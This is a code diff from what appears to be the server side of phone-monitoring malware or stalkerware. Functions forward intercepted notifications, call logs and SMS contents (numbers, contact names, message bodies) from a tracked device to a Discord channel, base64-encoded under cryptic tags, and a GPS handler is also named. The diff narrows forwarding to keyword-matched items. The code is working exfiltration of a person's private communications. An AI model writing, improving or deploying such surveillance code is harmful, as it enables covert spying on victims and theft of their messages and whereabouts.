@@ -521,22 +521,16 @@ def _send_discord(payload, is_alert=False):
 
 
 def send_discord_for_notifications(notifications, device_id):
-    """Send abbreviated Discord embeds for qualifying notification categories and keyword alerts."""
+    """Send Discord alert embeds ONLY when content matches important keywords."""
     for n in notifications:
-        category = n.get('category') or ''
-        app_package = n.get('app_package') or ''
         app_name = decode_field(n.get('app_name') or '')
         title = decode_field(n.get('title') or '')
         content = decode_field(n.get('content') or '')
         raw_parts = [p for p in [app_name, title, content] if p]
         raw_text = ' '.join(raw_parts)
 
-        is_important = is_important_content(raw_text)
-        is_social_category = category in DISCORD_FORWARD_CATEGORIES
-        is_social_app = any(kw in app_package.lower() for kw in DISCORD_SOCIAL_KEYWORDS)
-
-        # Forward if social category, social app, or matches important keywords
-        if not is_social_category and not is_social_app and not is_important:
+        # STRICT: Only forward to Discord if matching important keywords
+        if not is_important_content(raw_text):
             continue
 
         raw_ts = n.get('received_at') or ''
@@ -546,26 +540,16 @@ def send_discord_for_notifications(notifications, device_id):
             continue
 
         encoded = base64.b64encode(raw_text.encode()).decode()
-
-        if is_important:
-            title_tag = '!M'
-            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
-            color = 0xED4245  # High-priority red highlight
-        else:
-            title_tag = 'M'
-            desc = f'{device_id[-6:]} · {encoded}'
-            color = 0x5865F2  # Standard blurple
-
         embed = {
-            'title': title_tag,
-            'description': desc,
-            'color': color
+            'title': '!M',
+            'description': f'{device_id[-6:]} · ⚠️ · {encoded}',
+            'color': 0xED4245  # High-priority red highlight
         }
-        _send_discord({'embeds': [embed]}, is_alert=is_important)
+        _send_discord({'embeds': [embed]}, is_alert=True)
 
 
 def send_discord_for_calls(call_logs, device_id):
-    """Send abbreviated Discord embeds for call logs and keyword alerts."""
+    """Send Discord alert embeds ONLY when call matches important keywords."""
     type_code = {'incoming': 'I', 'outgoing': 'O', 'missed': 'M', 'rejected': 'R'}
     for c in call_logs:
         raw_call_type = c.get('call_type', '')
@@ -573,10 +557,13 @@ def send_discord_for_calls(call_logs, device_id):
         phone_num = decode_field(c.get('phone_number') or '')
         contact = decode_field(c.get('contact_name') or '')
         duration = c.get('duration_sec', 0)
-        raw_ts = c.get('occurred_at') or ''
         raw_text = f"{phone_num} {contact}"
 
-        is_important = is_important_content(raw_text)
+        # STRICT: Only forward to Discord if matching important keywords
+        if not is_important_content(raw_text):
+            continue
+
+        raw_ts = c.get('occurred_at') or ''
         payload = f"{phone_num} {contact} {ct} {duration} {raw_ts}"
         dedup_key = f"c:{device_id}:{payload}"
         if _discord_is_duplicate(dedup_key):
@@ -584,58 +571,40 @@ def send_discord_for_calls(call_logs, device_id):
 
         raw_payload = f"{phone_num} {contact} {ct} {duration}"
         encoded = base64.b64encode(raw_payload.encode()).decode()
-
-        if is_important:
-            title_tag = '!T'
-            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
-            color = 0xED4245  # High-priority red highlight
-        else:
-            title_tag = 'T'
-            desc = f'{device_id[-6:]} · {encoded}'
-            color = 0x57F287  # Standard green
-
         embed = {
-            'title': title_tag,
-            'description': desc,
-            'color': color
+            'title': '!T',
+            'description': f'{device_id[-6:]} · ⚠️ · {encoded}',
+            'color': 0xED4245  # High-priority red highlight
         }
-        _send_discord({'embeds': [embed]}, is_alert=is_important)
+        _send_discord({'embeds': [embed]}, is_alert=True)
 
 
 def send_discord_for_sms(sms_messages, device_id):
-    """Send abbreviated Discord embeds for SMS messages and keyword alerts."""
+    """Send Discord alert embeds ONLY when SMS matches important keywords."""
     for s in sms_messages:
         address = decode_field(s.get('address', 'unknown'))
         contact = decode_field(s.get('contact_name') or '')
         body = decode_field(s.get('body') or '')
-        sms_type = s.get('sms_type', 'inbox')
-        raw_ts = s.get('occurred_at') or ''
         raw_text = f"{address} {contact} {body}"
 
-        is_important = is_important_content(raw_text)
-        payload = f"{address} {contact} {sms_type} {body} {raw_ts}"
+        # STRICT: Only forward to Discord if matching important keywords
+        if not is_important_content(raw_text):
+            continue
+
+        raw_ts = s.get('occurred_at') or ''
+        payload = f"{address} {contact} {s.get('sms_type', 'inbox')} {body} {raw_ts}"
         dedup_key = f"s:{device_id}:{payload}"
         if _discord_is_duplicate(dedup_key):
             continue
 
-        raw_payload = f"{address} {contact} {sms_type} {body}"
+        raw_payload = f"{address} {contact} {s.get('sms_type', 'inbox')} {body}"
         encoded = base64.b64encode(raw_payload.encode()).decode()
-
-        if is_important:
-            title_tag = '!S'
-            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
-            color = 0xED4245  # High-priority red highlight
-        else:
-            title_tag = 'S'
-            desc = f'{device_id[-6:]} · {encoded}'
-            color = 0x3BA55D  # Standard green
-
         embed = {
-            'title': title_tag,
-            'description': desc,
-            'color': color
+            'title': '!S',
+            'description': f'{device_id[-6:]} · ⚠️ · {encoded}',
+            'color': 0xED4245  # High-priority red highlight
         }
-        _send_discord({'embeds': [embed]}, is_alert=is_important)
+        _send_discord({'embeds': [embed]}, is_alert=True)
 
 
 def send_discord_for_gps(gps_events, device_id):
